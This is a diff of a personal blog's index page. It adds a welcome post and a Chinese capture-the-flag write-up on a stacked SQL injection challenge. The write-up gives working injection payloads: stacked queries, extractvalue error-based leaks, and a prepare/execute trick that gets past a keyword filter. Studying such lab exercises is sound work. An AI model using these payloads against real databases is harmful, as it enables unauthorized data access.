@@ -124,7 +124,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">1</span>
+          <span class="site-state-item-count">3</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -135,7 +135,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-count">2</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -155,6 +155,194 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/05/one/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Z1d10t">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Have a good day !">
+      <meta itemprop="description" content="welcome to my blog (*^_^*)">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Have a good day !">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2023/02/05/one/" class="post-title-link" itemprop="url">one</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2023-02-05 20:29:51 / 修改时间：20:36:21" itemprop="dateCreated datePublished" datetime="2023-02-05T20:29:51+08:00">2023-02-05</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>正常操作后，发现只有两列，然后有正则匹配过滤了</p>
+<p>return preg_match(“/select|update|delete|drop|insert|where|./i”,$inject);</p>
+<p>这题考了堆叠注入，原理很简单，就是通过 <code>;</code> 号注入多条SQL语句。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;;show databases;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/34855848/1674105954316-2834e8d4-05b6-4fbb-aad5-60e2282718e3.png" alt="img"></p>
+<p>看一下当前的数据库，这里考到了报错注入</p>
+<p>原理：</p>
+<p>MySQL提供了一个 updatexml() 函数，当第二个参数包含特殊符号时会报错，并将第二个参数的内容显示在报错信息中。</p>
+<p>但是这题update被过滤了</p>
+<p>extractvalue() 传参时候稍有不同，其余都是一样的，用这两个函数时，常常用到拼接函数，将要要查询的语句和第二个特殊符号拼接起来一起回显。</p>
+<p>sql里拼接函数：concat，concat_ws ,group_concat</p>
+<p><code>1&#39; and extractvalue(1,concat(0x7e,database(),0x7e));</code> 0x7e 是十六进制~</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/34855848/1674107777766-0a679e06-d245-4a7c-9af1-b76701936f7c.png" alt="img"></p>
+<p>当前数据库在supersqli 注意结果是按照报错的方式回显的。</p>
+<p><code>-1&#39;;show tables;</code>爆表</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/34855848/1674106018238-7810382e-073c-4091-b72e-08fcd46441ba.png" alt="img"></p>
+<p>flag在那串数字里</p>
+<p>表名为数字时，要用反引号包起来查询。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;;show columns from `1919810931114514`;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/34855848/1674106177437-bba403ed-00ef-4142-bfef-6c0dcb0cb6ff.png" alt="img"></p>
+<p>然后要使用存储过程预编译知识，构造能执行的语句</p>
+<p>方法一：</p>
+<p>set @<a> = sql 语句；</p>
+<p>prepare <b> from @<a></p>
+<p>EXECUTE <b></p>
+<p>注意：一个@是用户变量，两个@是系统变量</p>
+<p>方法二：</p>
+<p>prepare <a> from 一个sql语句;</p>
+<p>EXECUTE <a>；</p>
+<p><a>的意思是一个名字</p>
+<p>其实两者原理都一样</p>
+<p>构造：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;set @a = concat(&#x27;se&#x27;,&#x27;lect * from `1919810931114514`;&#x27;);prepare b from @a;EXECUTE b;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/34855848/1674108504000-bb8f19b7-415c-4345-84ff-9f3573a9cfcc.png" alt="img"></p>
+<p>strstr()函数对大小写很敏感，通过大写绕过即可。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/34855848/1674108794007-3296b6e1-c3c3-4954-80f5-8ce1f9e4f3fa.png" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;Set @a = concat(&#x27;se&#x27;,&#x27;lect * from `1919810931114514`;&#x27;); Prepare b from @a; EXECUTE b;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/34855848/1674108615242-30869c84-be6a-4449-96aa-915b3865eac9.png" alt="img"></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%A0%B4%E5%A3%B3%E4%BA%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Z1d10t">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Have a good day !">
+      <meta itemprop="description" content="welcome to my blog (*^_^*)">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Have a good day !">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2023/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%A0%B4%E5%A3%B3%E4%BA%86/" class="post-title-link" itemprop="url">小破站破壳了</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2023-02-05 20:08:35 / 修改时间：20:28:16" itemprop="dateCreated datePublished" datetime="2023-02-05T20:08:35+08:00">2023-02-05</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>想来想去，看了其他许多大佬的文章，起初萌生了想建造一个属于自己的网站，但是建站不是一个简单的事情，只靠我现在的知识水平是完全不够的，于是就想简单简答的建造一个博客，用来分享我的一些做题过程与生活琐事。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2023/02/05/%E5%B0%8F%E7%A0%B4%E7%AB%99%E7%A0%B4%E5%A3%B3%E4%BA%86/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
